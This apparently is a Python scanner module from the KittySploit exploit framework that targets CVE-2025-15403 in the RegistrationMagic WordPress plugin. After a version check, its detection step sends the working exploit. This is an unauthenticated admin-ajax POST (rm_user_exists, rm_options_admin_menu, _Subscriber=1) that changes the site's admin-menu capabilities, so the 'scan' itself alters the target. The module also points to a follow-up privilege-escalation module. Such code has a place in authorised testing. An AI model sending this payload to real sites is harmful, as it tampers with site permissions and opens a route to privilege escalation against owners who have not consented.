#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""RegistrationMagic <= 6.0.7.1 rm_user_exists menu manipulation (CVE-2025-15403)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "custom-registration-form-builder-with-submission-manager"
_VULN_HIGH = (6, 0, 7)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "RegistrationMagic CVE-2025-15403 detect",
        "description": (
            "Detects CVE-2025-15403: unauthenticated admin-ajax rm_user_exists can alter "
            "rm_options_admin_menu capabilities (_Subscriber=1)."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2025-15403",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2025-15403",
            "https://github.com/Nxploited/CVE-2025-15403",
        ],
        "modules": ["auxiliary/admin/http/registrationmagic_cve_2025_15403_menu_privesc"],
        "tags": ["web", "scanner", "wordpress", "registrationmagic", "cve-2025-15403"],
        "agent": {
            "approval_required": True,
            "chain": {
                "suggested_followups": ["auxiliary/admin/http/registrationmagic_cve_2025_15403_menu_privesc"],
            },
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        readme = self.http_request(
            method="GET",
            path=self.wp_plugin_path(self.wp_normalize_base_path(self.base_path or "/"), _PLUGIN, "readme.txt"),
            allow_redirects=True,
        )
        if readme and readme.status_code == 200:
            ver = self.wp_extract_version_from_readme(readme.text or "")
            if ver and not self.wp_version_in_range(ver, (0, 0, 0), _VULN_HIGH):
                return False
        r = self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data={
                "action": "rm_user_exists",
                "rm_slug": "rm_options_admin_menu",
                "order": ",menu1",
                "_Subscriber": "1",
                "restore": "false",
                "enable_admin_order": "yes",
            },
            allow_redirects=False,
        )
        if not r or r.status_code != 200:
            return False
        body = (r.text or "").strip()
        if body == "-1" or len(body) > 5:
            return False
        self.set_info(
            severity="critical",
            reason="RegistrationMagic CVE-2025-15403 — rm_user_exists menu manipulation accepted",
            path="/wp-admin/admin-ajax.php",
            cve="CVE-2025-15403",
        )
        return True
